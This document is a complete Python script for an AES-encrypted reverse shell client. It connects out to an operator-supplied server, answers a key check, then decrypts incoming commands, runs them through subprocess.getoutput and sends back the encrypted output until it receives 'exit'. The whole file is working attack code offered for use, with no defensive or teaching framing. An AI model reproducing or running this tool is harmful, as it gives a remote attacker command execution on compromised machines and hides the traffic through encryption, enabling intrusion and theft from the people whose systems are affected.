#!/usr/bin/env python3

import socket
import argparse
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import subprocess

def aes_encrypt(data, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    return encryptor.update(padded_data) + encryptor.finalize()

def aes_decrypt(data, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    unpadder = padding.PKCS7(128).unpadder()
    decrypted_data = decryptor.update(data) + decryptor.finalize()
    return unpadder.update(decrypted_data) + unpadder.finalize()

def reverse_shell(server_ip, server_port, key, iv):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))
    try:
        server_challenge = client.recv(1024)
        if server_challenge == b"KEY_CHECK":
            client.send(key + iv)
        else:
            print("[!] Unexpected server response. Closing connection.")
            client.close()
            return
        while True:
            encrypted_command = client.recv(4096)
            if not encrypted_command:
                break
            command = aes_decrypt(encrypted_command, key, iv).decode('utf-8')
            if command.lower() == "exit":
                client.close()
                break
            output = subprocess.getoutput(command)
            encrypted_output = aes_encrypt(output.encode('utf-8'), key, iv)
            client.send(encrypted_output)
    except Exception as e:
        print(f"[!] Error: {e}")
        client.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--server", required=True, help="Server IP address")
    parser.add_argument("-p", "--port", required=True, type=int, help="Server port")
    parser.add_argument("-k", "--key", required=True, help="AES key in hex format (32 bytes)")
    parser.add_argument("-v", "--iv", required=True, help="AES IV in hex format (16 bytes)")
    args = parser.parse_args()
    key = bytes.fromhex(args.key)
    iv = bytes.fromhex(args.iv)
    if len(key) != 32 or len(iv) != 16:
        print("[!] Key must be 32 bytes and IV must be 16 bytes in hex format.")
        exit(1)
    reverse_shell(args.server, args.port, key, iv)
